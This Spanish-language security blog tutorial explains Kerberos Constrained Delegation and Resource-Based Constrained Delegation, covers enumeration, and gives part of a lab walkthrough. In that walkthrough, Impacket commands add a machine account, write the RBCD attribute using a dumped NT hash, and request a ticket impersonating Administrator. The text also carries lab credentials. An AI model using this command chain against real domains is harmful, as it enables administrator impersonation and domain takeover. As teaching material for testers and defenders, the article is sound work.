---
id: "constrained-delegation-y-resource-based-constrained-delegation"
title: "Constrained Delegation y Resource-Based Constrained Delegation (RBCD) - Kerberos"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2024-04-15
updatedDate: 2024-04-15
image: "https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-0.webp"
description: "Guía completa sobre Constrained Delegation y Resource-Based Constrained Delegation (RBCD) en Kerberos, incluyendo las extensiones S4U2Proxy y S4U2Self, enumeración y técnicas de explotación."
categories:
  - "active-directory"
draft: false
featured: false
lang: "es"
---

Previamente hemos hablado en otro artículo del [Unconstrained Delegation](/es/posts/unconstrained-delegation-kerberos/) y gracias a ello, sabemos que la delegación es un mecanismo existente en Kerberos para la delegación de credenciales y la impersonación de usuarios en un Directorio Activo.

Debido a que la delegación no restringida era demasiado insegura, Microsoft decidió lanzar dos opciones más seguras, el Constrained Delegation y el Resource-Based Constrained Delegation, también conocido como RBCD.

Sin embargo, el hecho de que sean opciones más seguras no elimina la posibilidad de que puedan ser aprovechadas por un atacante. Por ello, en este artículo vamos a ver cómo funcionan ambas delegaciones al mismo tiempo de ejemplos de explotación ;)

En cualquier caso, el verdadero fin del artículo es obtener la suficiente base como para no solo entender el tema en sí, sino tener una base sólida que te permita leer otros artículos del tema sin dificultad.

> Antes de leer este artículo es importante que no solo conozcas cómo funciona Kerberos, sino que también hayas visto y conozcas el funcionamiento de la delegación no restringida. De ambos temas hay artículos en el blog:
> 
> - [Humilde intento de explicar Kerberos](/es/posts/humilde-intento-de-explicar-kerberos/)
> - [Unconstrained Delegation – Kerberos](/es/posts/unconstrained-delegation-kerberos/)

- [Constrained Delegation](#constrained-delegation)
- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [Extensiones - S4U2Proxy y S4U2Self](#extensiones---s4u2proxy-y-s4u2self)
- [S4U2Proxy](#s4u2proxy)
- [S4U2Self](#s4u2self)
- [¿Evasión del msDS-AllowedToDelegateTo?](#evasión-del-msds-allowedtodelegateto)
- [Enumeración](#enumeración)
    - [Enumeración desde Linux](#enumeración-desde-linux)
    - [Enumeración desde Windows](#enumeración-desde-windows)
- [Detalles importantes de cara a las explotaciones](#detalles-importantes-de-cara-a-las-explotaciones)
    - [Versiones de Impacket](#versiones-de-impacket)
    - [Tipos de Servicios](#tipos-de-servicios)
    - [Kerberos Principal Name](#kerberos-principal-name)
- [Hora de la explotación :)](#hora-de-la-explotación-)
    - [Constrained Delegation](#constrained-delegation-1)
        - [Sin Transición de Protocolo](#sin-transición-de-protocolo)
        - [Con Transición de Protocolo](#con-transición-de-protocolo)
    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
- [Artículos interesantes (pero no mejores que este, obvio)](#artículos-interesantes-pero-no-mejores-que-este-obvio)
- [Referencias](#referencias)

## Constrained Delegation

El Constrained Delegation limita hacia qué servicios una cuenta puede ser delegada. Se configura a través de la propiedad msds-allowedtodelegateto que se puede encontrar en los atributos del objeto de una cuenta de servicio.

> Una cuenta de servicio se refiere tanto a una cuenta normal de usuario (user account) como una cuenta de ordenador (computer account). Ya que ambas pueden tener servicios asociados a ellos. Asimismo, una cuenta de usuario normal no se considera de servicio hasta que tenga SPNs asociados, por tanto estamos hablando de: cuentas normales que ejecuten servicios, y cuentas de equipo las cuales por defecto ya tienen servicios bajo su mando.

Vamos a enumerar ambos tipos de usuario de servicio:

- Cuenta de usuario con permiso de Constrained Delegation

![Cuenta de usuario con Constrained Delegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-1.avif)

El usuario de servicio jon.snow (user account) permite la delegación única y exclusivamente hacia el servicio CIFS que se ejecuta en la máquina WINTERFELL$.

Esto quiere decir que si un usuario se autentica contra alguno de los servicios que corran bajo jon.snow:

![SPNs asociados a jon.snow](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-2.avif)

Cualquiera de estos servicios podrá impersonar al usuario autenticado en el servicio CIFS de WINTERFELL$ (lo establecido en el valor del campo msds-allowedtodelegateto de la primera imagen).

- Cuenta de ordenador con permiso de Constrained Delegation

![Cuenta de ordenador con Constrained Delegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-3.avif)

El usuario de servicio CASTELBLACK$ (computer account) permite la delegación única y exclusivamente hacia el servicio HTTP de la máquina WINTERFELL$.

Esto de nuevo, quiere decir que si un usuario se autentica contra alguno de los servicios que corran bajo CASTELBLACK$:

![SPNs asociados a CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-4.avif)

Cualquiera de estos servicios podrá impersonar al usuario autenticado en el servicio HTTP de WINTERFELL$ (de nuevo, lo establecido en el valor del campo msds-allowedtodelegateto).

Aunque ahora lo veremos más técnicamente, en resumidas cuentas es lo siguiente:

1. Me autentico en el SERVICIO A
2. El SERVICIO A le dice al DC que me quiere impersonar en el RECURSO B (SERVICIO B)
3. El DC comprueba la lista (msds-allowedtodelegateto) de SERVICIO A
4. Si SERVICIO B se encuentra presente, pues el DC le deja impersonarme.

<figure>

![Diagrama de Constrained Delegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-5.avif)

<figcaption>

Fuente: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## Resource-Based Constrained Delegation (RBCD)

Por otro lado, el Resource Based Constrained Delegation (RBCD) funciona de manera distinta. Si nos fijamos en cualquiera de los dos ejemplos que hemos visto en el Constrained Delegation, podemos observar que la configuración de la delegación lo tiene por así decirlo el servidor intermedio. Por ejemplo:

- USUARIO --> SERVICIO A --> SERVICIO B (RECURSO)

Quien tendría la lista de SPN donde permite la delegación sería la cuenta que ejecuta el SERVICIO A. En el ejemplo de jon.snow sería tal que:

1. Un usuario robb.stark se autentica en el servicio CIFS de THEWALL$.
2. Este servicio corre bajo el usuario jon.snow, el cual tiene configurada una delegación para el servicio CIFS de WINTERFELL$.
3. Por tanto, el servicio CIFS de THEWALL$ podrá impersonar al usuario robb.stark en el servicio CIFS de WINTERFELL$.

En este caso quien tiene la potestad no deja de ser quien maneja el servicio intermedio. Sin embargo, en el Resource Based Constrained Delegation (RBCD) es al contrario, quien decide quien puede delegar contra él es el propio recurso, es decir, el SERVICIO B del primer ejemplo o haciendo referencia al último, lo tendría en todo caso el servicio CIFS de WINTERFELL$.

La configuración del RBCD se realiza en la propiedad msDS-AllowedToActOnBehalfOfOtherIdentity. Esta propiedad debe de tener como valor una lista de usuarios de servicio a los cuales les permita delegar contra si mismo.

Un ejemplo práctico sería:

1. El usuario Draco se autentica en el servicio HTTP de SERVIDOR-WEB.
2. El SERVIDOR-WEB dice, vale, quiero impersonar a Draco en un servicio que corre SERVIDOR-BACKEND.
3. Aquí, cuando SERVIDOR-WEB le pregunta al DC que quiere impersonar al usuario Draco en SERVIDOR-BACKEND, el DC dice, vale, ¿está SERVIDOR-WEB en la lista (msDS-AllowedToActOnBehalfOfOtherIdentity) de SERVIDOR-BACKEND?
4. Si lo está, le dejo. Si no lo está, no le dejo.

Tan aparentemente simple como esto.

> Por hacer el apunte aunque ya se haya dicho, en el Constrained Delegation la lista corresponde a SPN's. Mientras que en el RBCD, la lista corresponde a cuentas de servicio.

> Por otra parte, es importante saber que cualquier cuenta de servicio tiene permisos para configurar el RBCD de si mismo, es decir, cualquier cuenta de servicio puede editar su propio campo msDS-AllowedToActOnBehalfOfOtherIdentity. En el Constrained Delegation, la configuración la realizan los administradores.
> 
> Asimismo, cualquier cuenta del dominio que tenga privilegios GenericAll, GenericWrite o WriteProperty en una cuenta de servicio, podrá configurar el RBCD en esa cuenta de servicio.

Todo esto, de manera gráfica sería:

1. Me autentico en el SERVICIO A
2. El SERVICIO A le dice al DC que me quiere impersonar en el RECURSO B (SERVICIO B)
3. El DC, comprueba la lista (msDS-AllowedToActOnBehalfOfOtherIdentity) de RECURSO B (SERVICIO B).
4. Si en la lista se encuentra presente la cuenta de servicio de SERVICIO A, SERVICIO B permitirá la impersonación

<figure>

![Diagrama de RBCD](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-6.avif)

<figcaption>

Fuente: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## Extensiones - S4U2Proxy y S4U2Self

Ya hemos visto las ideas principales detrás del Constrained Delegation y del Resource-Based Constrained Delegation (RBCD). Sin embargo, esto no acaba aquí debido a que aún no hemos hablado de cómo se lleva a cabo y cómo es posible que se permitan ambas delegaciones, técnicamente hablando. Para entender bien todo, ahora hay que hablar de lo siguiente:

- S4U2Proxy
- S4U2Self

Estos dos nombres corresponden a extensiones del protocolo Kerberos que se crearon junto al Constrained Delegation. Gracias a estas dos extensiones, todo lo mencionado hasta ahora puede funcionar.

## S4U2Proxy

Esta extensión básicamente consiste en la posibilidad de que a partir de un TGS, se pueda pedir otro TGS para el mismo usuario pero para otro servicio.

Voy a traer el siguiente ejemplo del principio:

![Ejemplo de Constrained Delegation de CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-7.avif)

En este caso, de forma sencilla, imaginémonos que un usuario Draco se autentica en un servicio ejecutado por CASTELBLACK$ y este servicio puede impersonar a Draco en el servicio HTTP de WINTERFELL$. Vamos a desglosar este proceso de manera más técnica:

1. El usuario Draco, pide un TGS (petición KRB_TGS_REQ) para alguno de los servicios ejecutados por la cuenta de equipo CASTELBLACK$, supongamos que es el servicio HOST.
2. El usuario Draco recibe el TGS del DC y lo usa para autenticarse en el servicio HOST de CASTELBLACK$.
3. El servicio HOST de CASTELBLACK$ ha recibido el TGS del usuario Draco para su servicio. Ahora, el servicio HOST quiere impersonar al usuario Draco en el servicio HTTP de WINTERFELL$.
4. Para ello, CASTELBLACK$ realizará una petición al DC para pedirle un TGS en nombre del usuario Draco para el servicio HTTP de WINTERFELL$ (de nuevo, una petición KRB_TGS_REQ).
5. Esta petición KRB_TGS_REQ que realiza CASTELBLACK$ es un poco distinta debido a que se establecen los dos siguientes atributos:
    - additional-tickets: es un campo normalmente vacío, que deberá de contener el TGS que el propio servicio HOST ha recibido de Draco.
    - cname-in-addl-tkt: es una flag que se define en el campo [kdc-options de Microsoft](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/klist) que indica que el DC no debe de usar la información del servidor sino la información del TGS que se encuentra en el campo additional-tickets.
6. Una vez el DC reciba esta petición, verificará si CASTELBLACK$ tiene el permiso correspondiente para autenticarse en el servicio HTTP de WINTERFELL$ en nombre de otro usuario.

Todo este procedimiento aplica tanto para Constrained Delegation como para Resource-Based Constrained Delegation (RBCD). En ambos casos, se utiliza S4U2Proxy para solicitar tickets en nombre del usuario. La diferencia radica en cómo el Centro de Distribución de Claves (KDC) (aka. los controladores de dominio) verifica los permisos:

- En Constrained Delegation, el KDC verifica el atributo msDS-AllowedToDelegateTo de la cuenta de servicio solicitante para determinar si está autorizada a obtener un ticket para el servicio de destino en nombre del usuario.

- En RBCD, el KDC verifica el atributo msDS-AllowedToActOnBehalfOfOtherIdentity del servicio de destino para determinar si permite que la cuenta de servicio solicitante actúe en nombre del usuario.

En conclusión y con lo que nos tenemos que quedar es que la extensión S4U2Proxy permite a partir de un TGS de un usuario, pedir otro TGS para el mismo usuario pero otro servicio. Asimismo, esta extensión está siempre presente debido a que se ocupa de la propia idea de lo que es la delegación.

## S4U2Self

Ahora vamos a ver la segunda extensión, S4U2Self. Esta extensión es la que puede dar mas juego y por tanto quizás ser la mas peligrosa debido a que básicamente lo que permite es que una cuenta de servicio pueda pedir un TGS en nombre de cualquier usuario, el que quiera.

Como esta extensión da tanta libertad por así decirlo, no está presente en cualquier situación, solo en los siguientes casos:

- Cuando se hace uso de RBCD.
- Cuando en el Constrained Delegation, se habilita el uso de cualquier protocolo y no únicamente Kerberos, esto se conoce como Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION):

![Protocol Transition habilitado](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-8.avif)

> Técnicamente, el S4U2Self dentro del contexto de la Constrained Delegation siempre está presente, sea cual sea la situación (ya sea que la flag TrustedToAuthForDelegation del Protocol Transition esté presente o no).
> 
> El tema es que en las dos situaciones de arriba, el TGS que se obtenga, poseerá la flag "forwardable" habilitada, por lo que el TGS será reenviable a través de S4U2Proxy. En cualquier otra situación, se podrá hacer uso de S4U2Self, pero el TGS no será reenviable.

¿Qué es esto? Pues básicamente imagínate la siguiente situación:

- ¿Qué ocurre si un usuario se autentica en un servicio A que no usa Kerberos, pero el servicio B si que lo usa?

En este caso, el servicio A no posee un TGS el cual incluir en la presunta petición KRB\_TGS\_REQ que tiene que hacer debido a que el usuario no se lo ha dado al no usar Kerberos en la autenticación.

A esta situación se le conoce como el problema de doble salto (double-hop) y debido a ello, existe la extensión S4U2Self, que en este caso el servicio A podrá usar y pedir un TGS en nombre de este usuario a pesar de no tener su TGS.

- Esta petición KRB\_TGS\_REQ definirá en el campo PA-FOR-USER el nombre del usuario del que quiera el TGS.

Entonces, volviendo al Protocol Transition, cuando lo habilitamos se habilita la flag **TRUSTED_TO_AUTH_FOR_DELEGATION** en la cuenta de servicio. Un ejemplo de la cuenta jon.snow:

![Flag TRUSTED_TO_AUTH_FOR_DELEGATION en jon.snow](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-9.avif)

Para estos dos casos que hemos mencionado al principio, será cuando el S4U2Self se encuentre presente. Para mostrar por encima la peligrosidad de esta extensión, un par de ejemplos con los dos tipos de casos donde se puede dar.

- Constrained Delegation con Protocol Transition

Imagínate que te haces con una cuenta de servicio que posee la flag **TRUSTED\_TO\_AUTH\_FOR\_DELEGATION**, es decir, tiene el Protocol Transition habilitado.

Pues básicamente, podrás pedir un TGS en nombre de cualquier usuario (Administrator por ejemplo) y, además, usando el S4U2Proxy, podrás pedirlo para algún servicio que esté establecido en el campo msds-allowedtodelegateto.

Por tanto, no solo has comprometido esa cuenta de servicio, sino todos los servicios los cuales estén permitidos en la delegación.

- RBCD

Este caso de explotación quizás es un poquitín mas compleja. Imagina que consigues un usuario que tiene permisos GenericAll o GenericWrite en una cuenta de servicio. Pues, puedes usar este usuario para modificar el valor del campo msDS-AllowedToActOnBehalfOfOtherIdentity y añadir una cuenta de servicio tuya.

> Lo mas normal sería en todo caso una cuenta de equipo debido a que de manera por defecto cualquier usuario del dominio puede agregar hasta 10 cuentas de equipo al dominio. Todo por supuesto suponiendo que este valor no ha sido modificado a 0 por los administradores. Además, las cuentas de equipo de manera por defecto poseen servicios asociados.

Si usando ese usuario con permisos, añades a la propiedad del RBCD una cuenta manejada por ti. Ya podrás hacer uso de S4U2Proxy y S4U2Self para obtener un TGS en la cuenta de servicio objetivo como cualquier usuario.

Asimismo, oye, si la cuenta objetivo de por si ya es una cuenta con la Constrained Delegation configurada, no solo comprometerás la cuenta objetivo, sino todos los servicios que estén configurados en el Constrained Delegation.

Quizás este caso es un poco mas difícil de entender de primeras, pero vamos a verlos todos de manera práctica.

De manera gráfica, quedaría así:

<figure>

![Diagrama de S4U2Self y S4U2Proxy](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-10.avif)

<figcaption>

Fuente: https://en.hackndo.com/constrained-unconstrained-delegation/

</figcaption>

</figure>

## ¿Evasión del msDS-AllowedToDelegateTo?

Recordemos que el msDS-AllowedToDelegateTo es la propiedad del Constrained Delegation donde colocamos el SPN de los servicios a los que queramos permitir la delegación. Ahora bien, ¿Cómo que evasión?

Pues básicamente se descubrió que cuando obtienes un TGS para un servicio, puedes modificar el TGS localmente (por ejemplo, cambiar HOST por CIFS) para acceder a otro servicio.

El único requisito es que ambos servicios corran bajo el mismo usuario.

Sobre esto, podéis encontrar el [artículo original sobre Kerberos Delegation y SPNs de SecureAuth](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/).

Al parecer esta ocurrencia se le reportó a Microsoft y contestó algo así como:

![It's not a bug, it's a feature](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-11.avif)

Entonces básicamente, si en un Constrained Delegation está configurado una delegación a por ejemplo, el servicio CIFS de WINTERFELL$.

Spoiler, no es únicamente CIFS el servicio hacia el cual se permite la delegación. De nuevo, siempre y cuando el otro servicio que coloquemos corra bajo el mismo contexto de usuario. Debido a que de esta manera se comparte la misma clave de cifrado para los TGS.

> El control de acceso se basa en esta clave y no en la validación estricta del SPN en el Ticket. Por lo que modificando el campo sname en el Ticket, pues es posible hacer que el TGS parezca destinado a otro servicio bajo el mismo usuario.

## Enumeración

Antes de ver diferentes casos de explotaciones, vamos a ver como podemos enumerar las delegaciones en el directorio activo.

##### Enumeración desde Linux

Desde Linux, podemos usar el script findDelegation de Impacket para enumerar todas las delegaciones:

```bash
impacket-findDelegation <fqdn dominio>/<usuario>:<contraseña> -target-domain <fqdb dominio>
```

![Enumeración de delegaciones con findDelegation](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-12.avif)

En este caso obtenemos cualquier tipo de delegación, ya sea restringida (Constrained) o incluso no restringida (Unconstrained).

##### Enumeración desde Windows

Partiendo de la base de que cualquier información puede ser enumerada a través de LDAP. Desde Windows podemos usar por ejemplo Powerview para enumerar de manera rápida tanto la Constrained Delegation como la RBCD.

- Enumeración de Constrained Delegation

Aquí se deben de enumerar tanto las cuentas de usuarios normales como las de equipo:

```powershell
Get-DomainUser -TrustedToAuth
```

<figure>

![Enumeración de Constrained Delegation en cuentas de usuario normales](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-13.avif)

<figcaption>

Enumeración de Constrained Delegation en cuentas de usuario normales

</figcaption>

</figure>

```powershell
Get-DomainComputer -TrustedToAuth
```

<figure>

![Enumeración de Constrained Delegation en cuentas de equipo](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-14.avif)

<figcaption>

Enumeración de Constrained Delegation en cuentas de equipo

</figcaption>

</figure>

- Enumeración de Resource-Based Constrained Delegation

De nuevo, podemos usar Powerview para enumerar las cuenta de servicio que posean RBCD.

```powershell
Get-DomainUser | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}

Get-DomainComputer | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
```

![Enumeración de RBCD con PowerView](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-15.avif)

En este caso se nos devuelve una, y, si nos damos cuenta, el valor de msDS-AllowedToActOnBehalfOfOtherIdentity no es legible. Para automatizar todo el proceso de enumeración de RBCD y además obtener el nombre claro del objeto podemos usar el siguiente script:

```powershell
# Define una función para procesar los objetos de AD (usuarios y computadoras)
function Process-ADObjectWithRBCD {
    param(
        [Parameter(Mandatory = $true)]
        $ADObject
    )
    Write-Output "Processing object: $($ADObject.name)"
    $binaryValue = $ADObject.'msDS-AllowedToActOnBehalfOfOtherIdentity'
    
    # Convierte el valor binario a un descriptor de seguridad
    $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $binaryValue, 0

    # Muestra información del descriptor de seguridad
    $sd.DiscretionaryAcl | ForEach-Object {
        $sid = $_.SecurityIdentifier.ToString()
        # Intenta convertir el SID a un nombre de objeto usando ConvertFrom-SID
        try {
            $objectName = ConvertFrom-SID $sid
            Write-Output "SID: $sid has object name: $objectName"
        } catch {
            Write-Output "SID: $sid could not be converted to an object name."
        }
        Write-Output "Access Mask: $($_.AccessMask)"
        Write-Output "Ace Type: $($_.AceType)"
        Write-Output "---------------------------"
    }
    Write-Output "======================================="
}

# Obtiene y procesa todas las computadoras del dominio con RBCD configurado
$computersWithRBCD = Get-DomainComputer | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
foreach ($computer in $computersWithRBCD) {
    Process-ADObjectWithRBCD -ADObject $computer
}

# Obtiene y procesa todos los usuarios del dominio con RBCD configurado
$usersWithRBCD = Get-DomainUser | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
foreach ($user in $usersWithRBCD) {
    Process-ADObjectWithRBCD -ADObject $user
}
```

Si lo ejecutamos:

![Resultado del script de enumeración RBCD](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-16.avif)

Nos dice en este caso que el objeto CASTELBLACK permite la delegación RBCD al objeto rbcd_const$. Ambos en este caso son cuentas de equipo.

Además de lo visto, también es posible enumerar las delegaciones desde Bloodhound usando queries. Podéis consultar el [BloodHound Cypher Cheatsheet de Hausec](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/).

Filtrad por Delegation y encontrareis varias opciones según os convenga.

## Detalles importantes de cara a las explotaciones

###### Versiones de Impacket

Fíjate bien en las versiones de Impacket y la rama que estés usando, ya que dependiendo de ello, puede que algunos argumentos no estén disponibles según qué herramienta. Por ejemplo, en mi caso:

- Si ejecuto impacket-getST

![Versión impacket-getST](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-17.avif)

Hago uso de la versión 0.11.0 y tengo disponibles los argumentos que me salen en el panel de ayuda.

- Si ejecuto getST.py

![Versión getST.py rama desarrollo](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-18.avif)

Hago uso de la rama de desarrollo de Impacket, y tengo algunos argumentos más disponibles.

###### Tipos de Servicios

Dejo una tabla orientativa para poder observar que acciones podemos ejecutar según los servicios para los cuales tengamos Tickets.

| TIPOS DE SERVICIO | TICKETS DE SERVICIO |
| --- | --- |
| WMI | HOST   RPCSS |
| PowerShell Remoting | HOST   HTTP   Dependiendo del sistema operativo también:   WSMAN   RPCSS |
| WinRM | HOST   HTTP   Algunas veces solo necesitas:   WINRM |
| Scheduled Tasks | HOST |
| Windows File Share, también psexec | CIFS |
| Operaciones con LDAP, incluido DCSync | LDAP |
| Windows Remote Server Administration Tools | RPCSS   LDAP   CIFS |
| Golden Tickets | krbtgt |

###### Kerberos Principal Name

A la hora de la explotación, vamos a pedir múltiples tickets de servicio y vamos a usarlos. Y un detalle importante de esto es que, el Principal Name que se use para pedir el ticket debe de ser el mismo que el de cuando vaya a usarse.

Ejemplo práctico para que se entienda:

Si pido un ticket para el Principal Name kingslanding.sevenkingdoms.local:

![Petición de ticket con FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-19.avif)

Y lo intento usar especificando solo kingslanding, no funcionará:

![Error al usar ticket con nombre corto](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-20.avif)

Sin embargo, si especifico el mismo Principal Name que al pedir el ticket, es decir, kingslanding.sevenkingdoms.local:

![Uso correcto del ticket con FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-21.avif)

Sí funcionará.

De la misma manera, si pido un ticket para el Principal Name kingslanding:

![Petición de ticket con nombre corto](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-22.avif)

E intento usarlo especificando el Principal Name completo (kingslanding.sevenkingdoms.local), no funcionará:

![Error al usar ticket con FQDN](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-23.avif)

De nuevo, si especifico el mismo Principal Name que al pedir el ticket, es decir, kingslanding:

![Uso correcto del ticket con nombre corto](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-24.avif)

Sí funcionará :)

Por tanto, cuidado con esto de cara a las explotaciones.

## Hora de la explotación :)

Es hora de ver de manera práctica todos los conceptos vistos en este artículo. Para ello vamos a ver ejemplos de explotación tanto para Constrained Delegation como para Resource-Based Constrained Delegation.

![Delegaciones configuradas en el laboratorio](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-25.avif)

Aquí se van a mostrar ejemplos de explotación, pero no todas las posibles herramientas que se pueden usar para realizar estas explotaciones, para ello ya hay cheatsheets con todas las posibilidades y que, habiendo comprendido el tema, no supondrá ningún problema que sepamos usarlas.

Aun así, alguna que otra herramienta relacionada a esta, por mencionar mas que nada, serían Rubeus y Kekeo.

#### Constrained Delegation

###### Sin Transición de Protocolo

Vamos a empezar viendo cómo sería la explotación del Constrained Delegation sin Transición del Protocolo, es decir, la configuración sería la siguiente:

![Configuración Constrained Delegation sin Protocol Transition](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-26.avif)

Dentro de los dos casos posibles del Constrained Delegation, este es el más "complicado" pero vamos a ver cómo sería.

La situación básicamente es que el equipo CASTELBLACK$ tiene configurado un Constrained Delegation hacia el servicio HTTP del equipo de WINTERFELL$.

Y el objetivo nuestro es poder comprometer WINTERFELL$.

Para aprovecharnos de esto necesitamos primero de todo:

- Una cuenta en el dominio (que nos servirá para agregar una cuenta de ordenador)
- Cuenta de máquina del equipo de CASTELBLACK$, o por el contrario, una cuenta de dominio que tenga los privilegios suficientes como para poder editar el campo msDS-AllowedToActOnBehalfOfOtherIdentity de CASTELBLACK$ (es decir, permisos GenericAll, GenericWrite o WriteProperty en CASTELBLACK$)

Entonces, la idea para explotar esto es básicamente:

1. Agregar una cuenta de equipo usando nuestro usuario (recordemos que por defecto en un AD, el campo de MachineAccountQuota se establece en 10, por lo que cualquier usuario del dominio puede agregar hasta 10 cuentas de equipo).
2. Editar el campo msDS-AllowedToActOnBehalfOfOtherIdentity en CASTELBLACK$, es decir, nos ayudaremos de RBCD para comprometer WINTERFELL$ a través del Constrained Delegation. Al editar el campo en CASTELBLACK$, agregaremos como cuenta confiada la cuenta del equipo que acabamos de crear. Por lo que, desde la cuenta de equipo nuestra, podremos hacer uso de S4U2Self y S4U2Proxy, y posteriormente desde CASTELBLACK$ de S4U2Proxy para dar el salto a WINTERFELL$.

Teniéndolo claro, vamos a ellooo:

Como hemos dicho, agregamos una cuenta de equipo con un usuario de dominio nuestro:

```bash
impacket-addcomputer -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.50.11 'north.sevenkingdoms.local/arya.stark:Needle'
```

![Creación de cuenta de equipo](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-27.avif)

Desde el DC podemos visualizar la cuenta que acabamos de añadir:

![Cuenta de equipo creada en el DC](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-28.avif)

Ahora, vamos a suponer que hemos comprometido CASTELBLACK$ y obtenemos el LSA para obtener el hash NT de la propia cuenta de ordenador:

![Dump de LSA en CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-29.avif)

![Hash NT de CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-30.avif)

Teniendo la cuenta de equipo de CASTELBLACK$, vamos a editar su propio valor del campo msDS-AllowedToActOnBehalfOfOtherIdentity para agregar la cuenta del equipo que hemos creado, rbcd_const$:

```bash
impacket-rbcd -delegate-from 'rbcd_const$' -delegate-to 'castelblack$' -dc-ip 192.168.50.11 -action 'write' -hashes ':98d47d3d7e5be6ad987e05716fe42e14' north.sevenkingdoms.local/'castelblack$'
```

![Configuración RBCD en CASTELBLACK](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-31.avif)

Si visualizamos ahora los atributos del campo de CASTELBLACK$:

![Atributos de CASTELBLACK con RBCD configurado](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-32.avif)

![Detalle del campo msDS-AllowedToActOnBehalfOfOtherIdentity](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-33.avif)

Vemos que se ha editado el campo perfectamente.

Vale, pues con esto ya podemos hacer todo:

Hacemos uso de S4U2Self y S4U2Proxy para obtener desde la cuenta de equipo rbcd_const$, un TGS como Administrator para el servicio HOST de CASTELBLACK$:

```bash
getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 192.168.50.11 north.sevenkingdoms.local/'rbcd_const$':'rbcdpass'
```

